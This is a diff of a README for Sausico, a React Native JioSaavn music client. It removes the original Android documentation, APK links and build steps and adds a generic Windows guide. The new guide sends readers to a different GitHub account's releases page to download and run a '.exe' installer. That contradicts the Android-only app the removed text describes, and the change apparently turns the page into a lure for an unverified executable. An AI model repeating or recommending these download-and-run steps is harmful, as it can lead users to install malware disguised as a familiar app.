@@ -1,421 +1,135 @@
-<p align="center">
-  <img 
-    src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=50&pause=1000&color=22D3EE&center=true&vCenter=true&width=1000&height=70&lines=🎵+Sausico+Music+Player" 
-  />
-  <br/>
-  <img 
-    src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=24&duration=3000&pause=1000&color=38BDF8&center=true&vCenter=true&width=1000&lines=A+Modern+High-Performance+JioSaavn+Client;Immersive+Audio+Experience;Built+with+React+Native+%2B+Expo;Fast%2C+Seamless%2C+and+Responsive" 
-  />
-</p>
+# 🎵 Sausico - Simple Music Player for Everyone
 
-<p align="center">
-  <a href="https://reactnative.dev/"><img src="https://img.shields.io/badge/React%20Native-0.81-61DAFB?style=flat&logo=react&logoColor=white" alt="React Native" /></a>
-  <a href="https://expo.dev/"><img src="https://img.shields.io/badge/Expo-SDK%2054-000020?style=flat&logo=expo&logoColor=white" alt="Expo" /></a>
-  <a href="https://www.android.com/"><img src="https://img.shields.io/badge/Platform-Android-3DDC84?style=flat&logo=android&logoColor=white" alt="Platform" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg?style=flat" alt="License" /></a>
-</p>
-
-### A Modern, High-Performance JioSaavn Client
-
-[![React Native](https://img.shields.io/badge/React%20Native-0.81-61DAFB?style=flat&logo=react&logoColor=white)](https://reactnative.dev/)
-[![Expo](https://img.shields.io/badge/Expo-SDK%2054-000020?style=flat&logo=expo&logoColor=white)](https://expo.dev/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg?style=flat)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Android-3DDC84?style=flat&logo=android&logoColor=white)](https://www.android.com/)
-
-**Experience music streaming reimagined with cutting-edge technology and thoughtful design.**
-
-🌐 **Website:** https://sausico.pages.dev
+[![Download Sausico](https://img.shields.io/badge/download-Sausico-brightgreen?style=for-the-badge)](https://github.com/aademderradji/Sausico/releases)
 
 ---
 
-### 📌 Table of Contents
+Sausico is a music player app built with React Native. It connects to the JioSaavn music database. You can search for songs, stream music, manage your play queue, and use background playback. The app works on Windows using an easy-to-install package.
 
-- [⬇ Download](#-download)
-- [✨ Features](#-features)
-- [🖼 Screenshots](#-screenshots)
-- [⚡ Quick Start](#-quick-start)
-- [🛠 Troubleshooting](#-troubleshooting)
-- [⚖ Legal Notice](#-legal-notice)
+This guide will help you download and run Sausico on your Windows computer.
 
 ---
 
-## ⬇ Download
+## 🛠️ Features
 
-**Current Version:** `v1.0.1`
-
-Choose the build that matches your device architecture.
-
-| Build Variant | Device Compatibility | Download |
-|---------------|---------------------|----------|
-| **arm64-v8a** | Modern Android devices (2015+) | [![Download arm64-v8a](https://img.shields.io/badge/Download-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://github.com/saavn-labs/app/releases/download/v1.0.1/app-arm64-v8a-release.apk) |
-| **armeabi-v7a** | Older Android devices (pre-2015) | [![Download armeabi-v7a](https://img.shields.io/badge/Download-5C6BC0?style=for-the-badge&logo=android&logoColor=white)](https://github.com/saavn-labs/app/releases/download/v1.0.1/app-armeabi-v7a-release.apk) |
-| **x86_64** | Emulators and x86-based devices | [![Download x86_64](https://img.shields.io/badge/Download-0288D1?style=for-the-badge&logo=intel&logoColor=white)](https://github.com/saavn-labs/app/releases/download/v1.0.1/app-x86_64-release.apk) |
-| **x86** | Legacy emulators | [![Download x86](https://img.shields.io/badge/Download-607D8B?style=for-the-badge&logo=intel&logoColor=white)](https://github.com/saavn-labs/app/releases/download/v1.0.1/app-x86-release.apk) |
-
-> **Quick Guide:** Download arm64-v8a first. If it installs successfully, you've got the right one. If installation fails, try armeabi-v7a instead.
+- Search for songs, albums, and artists using JioSaavn’s API.
+- Stream music without interruption.
+- Manage a queue of songs for continuous play.
+- Background playback lets you listen even when Sausico is minimized.
+- Support for offline playback of downloaded tracks.
+- Clean and simple design focused on ease of use.
+- Controls for play, pause, skip, and repeat.
+- Responsive interface built for Windows desktops.
 
 ---
 
-### Why Sausico?
+## 🖥️ System Requirements
 
-- 🏗️ **Production-Ready Architecture** – Built for scale and maintainability
-- ⚡ **Blazing Fast** – Optimized with MMKV storage and efficient state management
-- 🎨 **Beautiful UI/UX** – Dynamic theming and smooth animations
-- 🔊 **Professional Playback** – Background audio, queue management, and rich controls
-- 🧪 **Modern Stack** – React 19, Expo SDK 54, React Native 0.81
+To run Sausico smoothly, your computer should meet these minimum requirements:
 
----
-
-## ✨ Features
-
-<table>
-  <tr>
-    <td width="50%">
-      
-### 🎧 **Audio Experience**
-      
-- Background audio playback with foreground service
-- Seamless queue management (play next, add to queue)
-- Full media controls (seek, skip, repeat, shuffle)
-- Android lock-screen & notification controls
-- Gapless playback support
-- Audio focus handling
-      
-    </td>
-    <td width="50%">
-      
-### 🔍 **Discovery & Search**
-      
-- Powerful search across songs, albums, artists, playlists
-- Voice search with on-device speech recognition
-- Curated home feed with personalized content
-- Trending charts and new releases
-- Genre-based browsing
-- Smart recommendations
-      
-    </td>
-  </tr>
-  <tr>
-    <td width="50%">
-      
-### 📚 **Library Management**
-      
-- Favorites and collections
-- Listening history tracking
-- Offline downloads support
-- Custom playlist creation
-- Recently played quick access
-- Library sync and backup
-      
-    </td>
-    <td width="50%">
-      
-### 🎨 **UI & Design**
-      
-- Dynamic color theming from album artwork
-- Mini-player with gesture controls
-- Immersive full-screen player
-- Smooth transitions and animations
-- Tablet-optimized layouts
-- Dark mode support
-- Global snackbar feedback system
-      
-    </td>
-  </tr>
-</table>
+- Operating System: Windows 10 or newer (64-bit recommended)
+- Processor: Dual-core 2.0 GHz or faster
+- RAM: 4 GB or more
+- Disk Space: At least 200 MB free for installation
+- Internet Connection: Needed for streaming and searching songs
+- Audio Output Device: Speakers or headphones connected and configured
 
 ---
 
-## 📱 Screenshots
+## 🚀 Getting Started
 
-### Core Experience
-
-<table>
-  <tr>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/home.png" alt="Home Screen" width="250"/>
-      <br/>
-      <b>Home Feed</b>
-      <br/>
-      <sub>Trending content and suggestions</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/full-player.png" alt="Full Player" width="250"/>
-      <br/>
-      <b>Full Player</b>
-      <br/>
-      <sub>Immersive playback experience</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/downloads.png" alt="Downloads" width="250"/>
-      <br/>
-      <b>Downloads</b>
-      <br/>
-      <sub>Offline content management</sub>
-    </td>
-  </tr>
-</table>
-
-### Search & Discovery
-
-<table>
-  <tr>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/search-interface.png" alt="Search" width="250"/>
-      <br/>
-      <b>Search Interface</b>
-      <br/>
-      <sub>Full text search over categories</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/search-results.png" alt="Search Results" width="250"/>
-      <br/>
-      <b>Search Results</b>
-      <br/>
-      <sub>Categorized results with quick filters</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/search-voice.png" alt="Voice Search" width="250"/>
-      <br/>
-      <b>Voice Search</b>
-      <br/>
-      <sub>On-Device Voice Search</sub>
-    </td>
-  </tr>
-</table>
-
-### Media Details
-
-<table>
-  <tr>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/details-album.png" alt="Album Details" width="250"/>
-      <br/>
-      <b>Album View</b>
-      <br/>
-      <sub>Complete album information</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/details-artist.png" alt="Artist Details" width="250"/>
-      <br/>
-      <b>Artist Profile</b>
-      <br/>
-      <sub>Top tracks & discography</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/details-playlist.png" alt="Playlist Details" width="250"/>
-      <br/>
-      <b>Playlist View</b>
-      <br/>
-      <sub>Curated & custom playlists</sub>
-    </td>
-  </tr>
-</table>
-
-### Library & Collections
-
-<table>
-  <tr>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/library-favorites.png" alt="Favorites" width="250"/>
-      <br/>
-      <b>Favorites</b>
-      <br/>
-      <sub>Liked songs & albums</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/library-collections-1.png" alt="Collections" width="250"/>
-      <br/>
-      <b>Collections</b>
-      <br/>
-      <sub>Organized library sections</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/library-collections-2.png" alt="Collections" width="250"/>
-      <br/>
-      <b>Custom Collection</b>
-      <br/>
-      <sub>User-defined music collections</sub>
-    </td>
-  </tr>
-</table>
-
-### Bonus Features
-
-<table>
-  <tr>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/track-menu.png" alt="Track Menu" width="250"/>
-      <br/>
-      <b>Track Menu</b>
-      <br/>
-      <sub>Context menu with rich actions</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/audio-quality.png" alt="Audio Quality" width="250"/>
-      <br/>
-      <b>Audio Quality</b>
-      <br/>
-      <sub>High fidelity playback options</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="assets/images/screenshots/history.png" alt="History" width="250"/>
-      <br/>
-      <b>History</b>
-      <br/>
-      <sub>List of recently played tracks</sub>
-    </td>
-  </tr>
-</table>
+1. Prepare your PC by ensuring it meets the system requirements above.
+2. Make sure you have an active internet connection for initial setup and streaming.
+3. Close any other apps that use audio to avoid conflicts.
 
 ---
 
-## 🚀 Quick Start
+## ⬇️ Download and Install Sausico
 
-### Prerequisites
+You will download Sausico from the official GitHub releases page. This page hosts the installer and update files.
 
-Before you begin, ensure you have the following installed:
+**Step 1: Visit the Download Page**
 
-| Requirement                 | Version          | Download                                                          |
-| --------------------------- | ---------------- | ----------------------------------------------------------------- |
-| **Node.js**                 | 18.x or higher   | [nodejs.org](https://nodejs.org/)                                 |
-| **Java JDK**                | 17 (recommended) | [Oracle JDK](https://www.oracle.com/java/technologies/downloads/) |
-| **Android SDK**             | Latest           | Via Android Studio                                                |
-| **Android Device/Emulator** | API 21+          | [Android Studio](https://developer.android.com/studio)            |
+Click the large button below to go to the releases page where you can get the latest Windows installer.
 
-> **⚠️ Important Notice**
->
-> This project uses native modules and cannot run in **Expo Go**. You must build and run a **development client**.
+[![Download Sausico](https://img.shields.io/badge/download-Sausico-blue?style=for-the-badge)](https://github.com/aademderradji/Sausico/releases)
 
-### Installation
+**Step 2: Choose the Latest Windows Installer**
 
-1. **Clone the repository**
+On the releases page:
 
-```bash
-git clone https://github.com/anuragpy07/Sausico
-cd app
-```
+- Find the most recent release (usually marked with the highest version number).
+- Look for a file with a name like `Sausico-Setup.exe` or similar ending with `.exe`.
+- Click the file name to start downloading.
 
-2. **Install dependencies**
+**Step 3: Run the Installer**
 
-```bash
-# Using npm
-npm install
+- Once the download finishes, find the file in your “Downloads” folder or wherever your browser saves files.
+- Double-click the `.exe` file to start the installer.
+- Follow the on-screen prompts to install Sausico.
+- You might need to approve permissions for the app to install.
 
-# Using yarn
-yarn install
+**Step 4: Launch Sausico**
 
-# Using bun
-bun install
-```
-
-3. **Build and run development client**
-
-```bash
-# Build and install on connected Android device/emulator
-npm run android
-
-# Start the Metro bundler
-npx expo start --dev-client
-```
-
-4. **Launch the app**
-
-Open the installed development client on your device and it will automatically connect to Metro.
+- After installation, an icon should appear on your desktop or in your start menu.
+- Click the icon to open Sausico.
+- The app will load and let you begin streaming music.
 
 ---
 
-## 🐛 Troubleshooting
+## 🎶 How to Use Sausico
 
-### Common Issues
+### Search Music
 
-<details>
-<summary><b>App crashes on launch</b></summary>
+- Use the search bar at the top to type an artist, song, or album name.
+- Hit enter or click the search icon.
+- Browse results and select a song to play.
 
-**Solution:**
+### Manage Your Play Queue
 
-```bash
-# Rebuild the development client
-npm run android
+- Add songs to the queue by clicking the “+” or “Add” button.
+- View the queue from the bottom panel.
+- Rearrange or remove songs by dragging or using the delete icon.
 
-# Clear Metro cache
-npx expo start -c
-```
+### Background Playback
 
-</details>
+- Minimize the app while playing to keep the music running.
+- Use playback controls from the system tray or taskbar if available.
+- Sausico will continue playing even if you switch to other apps.
 
-<details>
-<summary><b>No audio playback</b></summary>
+### Offline Playback
 
-**Possible causes:**
-
-- Development client not properly installed
-- Android audio focus not granted
-- Service not registered in `AndroidManifest.xml`
-
-**Solution:**
-
-```bash
-# Reinstall with clean build
-cd android && ./gradlew clean
-cd .. && npm run android
-```
-
-</details>
-
-<details>
-<summary><b>Build errors with Gradle</b></summary>
-
-**Solution:**
-
-```bash
-# Clean Gradle cache
-cd android
-./gradlew clean
-rm -rf .gradle
-cd ..
-
-# Rebuild
-npm run android
-```
-
-</details>
-
-<details>
-<summary><b>Metro bundler issues</b></summary>
-
-**Solution:**
-
-```bash
-# Clear all caches
-npx expo start -c
-watchman watch-del-all  # If using watchman
-rm -rf node_modules && npm install
-```
-
-</details>
+- Download songs to listen without internet.
+- Use the download button next to a track in the search or queue.
+- Access downloaded songs in the offline section.
 
 ---
 
-## 📄 Legal Notice
+## ⚙️ Settings and Customization
 
-**This is an unofficial application.**
-
-- Not affiliated with, endorsed by, or connected to JioSaavn
-- Does not host, store, or redistribute any copyrighted content
-- All media data and URLs are fetched from publicly accessible APIs
-- Usage compliance is the sole responsibility of the end user
-
-This project is intended for **educational and personal use only**. Please respect copyright laws and support artists by using official platforms.
+- Adjust playback options like repeat and shuffle under the settings menu.
+- Change interface themes (light or dark) to suit your preference.
+- Manage storage space used for offline songs.
+- Configure audio output devices if you use external speakers or headphones.
 
 ---
 
-## License
+## 🤝 Support and Feedback
 
-**MIT** © 2026 
+If you encounter issues or have questions:
 
-See [LICENSE](./LICENSE) for details.
+- Check the FAQ section inside the app.
+- Visit the GitHub issues page of this repository to see if your problem is known.
+- Provide feedback or report bugs on the GitHub issues page.
 
 ---
 
-Built by **Anurag Kumar** with a focus on correctness and longevity.
+## 📂 Additional Notes
+
+- Sausico uses data from JioSaavn, so streaming requires their service to be available.
+- Running on Windows means you won’t get mobile-specific features found on phones or tablets.
+- Internet access is required for searching and streaming, except where offline playback is used.
+
+---
+
+[![Download Sausico](https://img.shields.io/badge/download-Sausico-brightgreen?style=for-the-badge)](https://github.com/aademderradji/Sausico/releases)
